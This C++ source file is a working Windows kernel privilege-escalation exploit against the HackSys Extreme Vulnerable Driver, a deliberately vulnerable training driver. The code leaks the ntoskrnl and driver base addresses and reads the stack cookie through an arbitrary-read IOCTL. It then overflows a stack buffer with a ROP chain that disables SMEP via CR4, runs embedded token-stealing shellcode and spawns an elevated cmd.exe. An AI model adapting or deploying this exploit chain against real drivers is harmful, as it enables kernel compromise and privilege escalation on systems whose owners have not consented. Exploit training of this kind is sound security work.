#pragma once
#define USE_WBINVD

#include <windows.h>
#include <iostream>
#include <psapi.h>
#include "internals.h"


int main() {

	BOOL bResult = FALSE;

	LPVOID drivers[0x500] = { 0 };
	DWORD cbNeeded;
	LPVOID ntoskrnlBase = NULL, hevdBase = NULL;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		for (int i = 0; i < cbNeeded / sizeof(LPVOID); i++) {
			char szDriver[0x100] = { 0 };
			GetDeviceDriverBaseNameA(drivers[i], szDriver, 0x100);
			if (strcmp("ntoskrnl.exe", szDriver) == 0) {
				ntoskrnlBase = drivers[i];
				printf("[+] Found ntoskrnl.exe at: 0x%p\n", ntoskrnlBase);
			}
			if (strcmp("HEVD.sys", szDriver) == 0) {
				hevdBase = drivers[i];
				printf("[+] Found HEVD.exe at: 0x%p\n", hevdBase);
			}
			if (hevdBase && ntoskrnlBase) break;
		}
	}
	else {
		printf("[-] Failed EnumDeviceDrivers: %d\n", GetLastError());
		bResult = FALSE;
	}

	typedef struct ArbitraryReadBuffer
	{
		uintptr_t readAddress;
		uintptr_t outBuf;
	} ArbitraryReadBuffer;

	ArbitraryReadBuffer arbReadBuf = { 0 };
	ULONGLONG readBuffer = 0;

	arbReadBuf.readAddress = 0x03000 + (intptr_t)hevdBase;
	arbReadBuf.outBuf = (intptr_t)&readBuffer;

	LPCSTR symlink_driver = "\\\\.\\HackSysExtremeVulnerableDriver";
	HANDLE hdriver = CreateFileA(symlink_driver, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hdriver)
	{
		printf("Failed to get handle =(\n");
	}
	DWORD ret;


	bResult = DeviceIoControl(hdriver, 0x22200B, &arbReadBuf, sizeof(arbReadBuf), NULL, 0, &ret, NULL);

	if (!bResult)
	{
		printf("IOCTL Failed: %X\n", GetLastError());
	}

	ULONGLONG stackCookie = readBuffer;
	printf("[+] Stack cookie is: 0x%llx\n", stackCookie);


	BYTE mem[100] = { 0 };
	memset(mem, '\x41', 100);


	bResult = DeviceIoControl(hdriver, 0x222007, mem, 100, NULL, 0, &ret, NULL);
	if (!bResult)
	{
		printf("IOCTL Failed: %X\n", GetLastError());
	}


	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	_NtQuerySystemInformation query = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}

	ULONG len = 2000;
	NTSTATUS status = NULL;
	PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
	do {
		pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemSessionProcessInformation, pProcessInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	UNICODE_STRING proc = { 0 };
	_RtlInitUnicodeString  init = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
	_RtlEqualUnicodeString  equal = (_RtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");

	init(&proc, L"exploit_overflow_gs.exe");
	PVOID stackLimit = NULL;
	while (pProcessInfo != NULL) {
		if (equal(&(pProcessInfo->ImageName), &proc, TRUE)) {
			for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
				PVOID stackBase = pProcessInfo->Threads[i].StackBase;
				stackLimit = pProcessInfo->Threads[i].StackLimit;
				printf("[+] StackBase 0x%llx\r\n", stackBase);
				printf("[+] Stack limit 0x%llx\r\n", stackLimit);
				break;
			}
		}
		if (!pProcessInfo->NextEntryOffset) {
			pProcessInfo = NULL;
		}
		else {
			pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
		}
	}

	printf("[+] Searching down from stack limit: 0x%llx\n", stackLimit);
	intptr_t stackSearch = (intptr_t)stackLimit - 0xff0;

	BOOL foundControlCode = FALSE;
	while (stackSearch < (intptr_t)stackLimit - 0x10) {
		arbReadBuf.readAddress = stackSearch;
		arbReadBuf.outBuf = (intptr_t)&readBuffer;

		bResult = DeviceIoControl(hdriver, 0x22200B, &arbReadBuf, sizeof(arbReadBuf), NULL, 0, &ret, (LPOVERLAPPED)NULL);

		if (!bResult) {
			printf("[-] Failed sending IOCTL\n");
			bResult = FALSE;
		}
		if (readBuffer == 0x22200B) {
			printf("[+] Found IOCTL in the stack at: 0x%llx\n", stackSearch);
			foundControlCode = TRUE;
			break;
		}
		stackSearch += sizeof(intptr_t);
	}
	if (!foundControlCode) {
		printf("[-] Failed finding control code in stack\n");
		bResult = FALSE;
	}

	//ULONGLONG rsp = (intptr_t)stackLimit - 0xaa0;
	ULONGLONG rsp = stackSearch - 0x2a8;
	printf("[+] RSP xor: 0x%llx\n", rsp);

	ULONGLONG xoredCookie = rsp ^ stackCookie;
	printf("[+] Xored cookie is: 0x%llx\n", xoredCookie);


	BYTE shellcode[] = "\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00\x48\x8b\x80\xb8\x00\x00\x00\x49\x89\xc7\x4d\x8b\xbf\xf0\x02\x00\x00\x49\x81\xef\xf0\x02\x00\x00\x49\x8b\x8f\xe8\x02\x00\x00\x80\xf9\x04\x75\xe6\x49\x8b\x8f\x58\x03\x00\x00\x80\xe1\xf0\x48\x89\x88\x58\x03\x00\x00\x48\x83\xc4\x10\x4d\x31\xff\xc3";


	LPVOID payload = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(payload, shellcode, sizeof(shellcode));

	BYTE mem2[600] = { 0 };

	memset(mem2, '\x41', 512);
	INT64 cookie = (INT64)((PCHAR)xoredCookie);
	INT64 rop_ret = (INT64)(((PCHAR)ntoskrnlBase) + 0x014c8);
	INT64 pop_rcx = (INT64)(((PCHAR)ntoskrnlBase) + 0xe37a);
	INT64 cr4_value = 0x506f8;
	INT64 mov_rcx_cr4 = (INT64)(((PCHAR)ntoskrnlBase) + 0x3ea04);

	memcpy(mem2 + 512, (PINT64)&cookie, 8);
	memcpy(mem2 + 568, (PINT64)&pop_rcx, 8);
	memcpy(mem2 + 576, (PINT64)&cr4_value, 8);
	memcpy(mem2 + 584, (PINT64)&mov_rcx_cr4, 8);
	memcpy(mem2 + 592, (PINT64)&payload, 8);


	//system("pause");


	printf("[+] Ret Gadget %p\n", (PINT64)&rop_ret);
	printf("[+] Pop rcx Gadget %p\n", (PINT64)&pop_rcx);
	printf("[+] CR4 value %p\n", (PINT64)&cr4_value);
	printf("[+] Mov rcx, cr4 Gadget %p\n", (PINT64)&mov_rcx_cr4);
	printf("[+] Shellcode address %p\n", (PINT64)&payload);

	bResult = DeviceIoControl(hdriver, 0x222007, mem2, 608, NULL, 0, &ret, NULL);;
	if (!bResult)
	{
		printf("IOCTL Failed: %X\n", GetLastError());
	}

	system("cmd.exe ");

}